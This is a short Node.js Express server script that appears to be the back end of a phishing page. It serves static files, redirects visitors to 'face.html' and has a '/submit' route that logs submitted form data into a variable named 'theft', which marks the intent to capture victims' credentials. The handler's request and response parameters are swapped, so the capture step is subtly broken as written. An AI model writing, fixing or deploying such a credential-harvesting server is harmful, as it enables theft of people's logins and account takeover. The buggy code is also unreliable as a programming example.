const https = require('https');
const fs = require('fs');
const path = require('path');
const express = require('express');
const parsed=require('body-parser');
const port= 91;
const ip ='192.168.100.78';

const app = express();
app.use(express.static(path.join(__dirname,'public')));

app.use(parsed.urlencoded({extended:true}));

app.post('/submit',(res,req)=>{
  const theft = req.body;
  console.log(theft);
});

app.get('/',(req,res)=>{

setTimeout(()=>{
res.redirect('/face.html');
},2000);
});

// Load SSL certificate and private key
const options = {
  key: fs.readFileSync(path.join(__dirname, 'server.key')),
  cert: fs.readFileSync(path.join(__dirname, 'server.cert')),
};

// Create the HTTPS server
const server=https.createServer(options, app);

server.listen(port,ip,()=>{
    console.log('server is on port ',port);
});